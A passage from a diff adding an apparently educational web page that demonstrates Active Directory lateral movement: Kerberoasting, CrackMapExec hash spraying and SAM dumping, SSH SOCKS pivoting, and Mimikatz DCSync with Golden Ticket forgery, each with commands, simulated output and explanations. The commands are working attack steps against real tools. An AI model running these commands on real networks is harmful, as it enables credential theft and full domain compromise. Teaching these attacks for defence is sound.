+[+] Starting service xBMx
+
+Microsoft Windows [Version 10.0.17763.2803]
+C:\\Windows\\system32> whoami
+nt authority\\system
+
+C:\\Windows\\system32> hostname
+DB-SERVER-01`,
+    verdict:'<strong>Lateral movement via Pass-the-Hash!</strong> The NTLM hash from the web server worked on the DB server — the local Administrator account uses the same password across hosts. No cracking needed — the hash itself is the credential in NTLM. CrackMapExec can spray the hash across the entire subnet in seconds to find all matching hosts.'
+  },
+  kerberoast:{
+    setup:`Starting position: domain user shell on 10.10.1.10
+Domain: corp.local
+Current user: john (regular domain user — low privilege)
+Goal: find a crackable service account with elevated rights`,
+    attack:`# Request TGS tickets for all SPNs (any domain user can do this)
+impacket-GetUserSPNs corp.local/john:Password1 \\
+  -dc-ip 10.10.1.5 \\
+  -request \\
+  -outputfile kerberoast.txt
+
+# Crack offline — no further network activity needed:
+hashcat -a 0 -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule`,
+    result:`ServicePrincipalName            Name          MemberOf
+------------------------------  ------------  ---------------------------
+HTTP/intranet.corp.local:80     svc_web       Domain Users
+MSSQLSvc/db.corp.local:1433     svc_mssql     Domain Admins  ← HIGH VALUE!
+
+[*] Getting TGS for svc_mssql
+
+hashcat status: Cracked!
+$krb5tgs$23$*svc_mssql*...: Serv1ceP@ss2023
+
+# svc_mssql is a member of Domain Admins!
+# Log in as DA:
+evil-winrm -i 10.10.1.5 -u svc_mssql -p 'Serv1ceP@ss2023'
+# → Domain Controller shell!`,
+    verdict:'<strong>Domain Admin via Kerberoasting!</strong> A regular domain user requested a TGS ticket for svc_mssql — encrypted with the service account\'s password hash. The ticket was cracked offline in minutes. Since svc_mssql was a Domain Admin member, cracking it gave full domain compromise.'
+  },
+  cme_spray:{
+    setup:`Starting position: NTLM hash for local Administrator
+10.10.1.0/24 subnet with 50 hosts
+Goal: find all hosts where this hash works (same local admin password)`,
+    attack:`# CrackMapExec subnet spray — one command, all hosts
+crackmapexec smb 10.10.1.0/24 \\
+  -u Administrator \\
+  -H aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \\
+  --continue-on-success
+
+# Dump SAM from all compromised hosts:
+crackmapexec smb 10.10.1.0/24 -u Administrator \\
+  -H 8846f7eaee8fb117ad06bdd830b7586c --sam`,
+    result:`SMB  10.10.1.10  445  WEB01    [+] Administrator (Pwn3d!)
+SMB  10.10.1.11  445  WEB02    [-] STATUS_LOGON_FAILURE
+SMB  10.10.1.20  445  DB01     [+] Administrator (Pwn3d!)
+SMB  10.10.1.21  445  DB02     [+] Administrator (Pwn3d!)
+SMB  10.10.1.30  445  DEV01    [-] STATUS_LOGON_FAILURE
+SMB  10.10.1.40  445  FILES01  [+] Administrator (Pwn3d!)
+SMB  10.10.1.50  445  ADMIN01  [+] Administrator (Pwn3d!)
+
+[+] 4/50 hosts compromised with same local admin hash
+[+] SAM dump from DB01: svc_backup NTLM: c74db1b6f0a51...
+                        svc_backup is member of Domain Admins!`,
+    verdict:'<strong>4 hosts compromised in one command!</strong> The same local Administrator hash worked across WEB01, DB01, DB02, FILES01, and ADMIN01 — a consequence of using a shared local admin image. CrackMapExec also dumped the SAM from all compromised hosts, revealing a domain admin service account.'
+  },
+  ssh_pivot:{
+    setup:`Starting position: SSH access to 10.10.1.10 (web server)
+Discovered in /etc/hosts: 10.10.2.0/24 (internal dev segment)
+No direct route from attacker machine to 10.10.2.x
+Goal: scan and access the dev segment through 10.10.1.10`,
+    attack:`# Create SOCKS5 proxy through the pivot host
+ssh -D 1080 -N -f user@10.10.1.10
+
+# Configure proxychains to use port 1080
+echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
+
+# Now scan the previously unreachable segment
+proxychains nmap -sT -p 22,80,443,445,3306,5432 10.10.2.0/24
+
+# Access discovered services:
+proxychains ssh devadmin@10.10.2.15
+proxychains mysql -h 10.10.2.30 -u root -p`,
+    result:`# Proxychains nmap results (10.10.2.0/24):
+10.10.2.10: 22/open (SSH)
+10.10.2.15: 22/open, 80/open (dev server)
+10.10.2.20: 22/open (build server)
+10.10.2.30: 3306/open (MySQL - no auth!)
+10.10.2.50: 22/open, 8080/open (Jenkins!)
+
+# Unauthenticated MySQL:
+proxychains mysql -h 10.10.2.30 -u root
+mysql> show databases;
+production_db, customer_data, api_keys  ← all exposed!
+
+# Jenkins without auth:
+proxychains curl http://10.10.2.50:8080/script  ← Groovy console RCE!`,
+    verdict:'<strong>Internal segment exposed via SSH pivot!</strong> The SOCKS proxy through 10.10.1.10 made the entire 10.10.2.0/24 segment reachable — revealing an unauthenticated MySQL server with production databases, and a Jenkins instance with an open Groovy console (instant RCE). Neither was reachable from the internet.'
+  },
+  golden:{
+    setup:`Starting position: SYSTEM on Domain Controller (10.10.1.5)
+Already have DC access — goal: establish permanent, unrevokable domain access
+even after incident response changes all passwords`,
+    attack:`# Step 1: Extract krbtgt hash (the key to Golden Tickets)
+mimikatz.exe
+privilege::debug
+lsadump::dcsync /user:krbtgt
+# krbtgt NTLM: 819af826bb148e603acb0f33d17632f8
+
+# Step 2: Get domain SID
+whoami /all    # → S-1-5-21-3107438834-1958874848-3154073385
+
+# Step 3: Forge golden ticket for any user
+kerberos::golden /user:FakeGodAdmin /domain:corp.local \\
+  /sid:S-1-5-21-3107438834-1958874848-3154073385 \\
+  /krbtgt:819af826bb148e603acb0f33d17632f8 \\
+  /groups:512 /ptt`,
+    result:`# Golden Ticket forged and injected into session:
+[+] Ticket: FakeGodAdmin @ corp.local
+
+# Use it immediately:
+dir \\\\CORP-DC01\\C$
+ Volume in drive \\\\CORP-DC01\\C$ has no label
+ Directory of \\\\CORP-DC01\\C$
+ ...
+
+psexec \\\\CORP-DC01 cmd.exe
+C:\\Windows\\system32> whoami
+corp\\FakeGodAdmin
+
+# Golden ticket persists until krbtgt is reset TWICE (10hr default validity)
+# Even if ALL user passwords changed → ticket still valid
+# Effective persistence for 10 years if not rotated`,
+    verdict:'<strong>Golden Ticket — permanent domain persistence!</strong> With the krbtgt hash, an attacker can forge Kerberos tickets for ANY user in the domain, with ANY group membership, valid for any duration. This persists through password resets until the krbtgt account password is rotated — twice, because of Kerberos ticket caching. This is why the krbtgt hash is the true "crown jewel" of Active Directory.'
+  }
+};
+
+function runDemo(){
+  const k=document.getElementById('lateral-select').value;
+  const d=DEMOS[k];
+  document.getElementById('setup-out').innerHTML='<span style="color:#888">'+d.setup+'</span>';
+  document.getElementById('attack-out').innerHTML='<span style="color:#fbbf24">'+d.attack+'</span>';
+  document.getElementById('result-out').innerHTML='<span style="color:#f87171">'+d.result+'</span>';
+  const v=document.getElementById('demo-verdict');
+  v.className='result-box r-red';
+  v.innerHTML=d.verdict;
+}
+runDemo();
+</script>
+</body>
+</html>
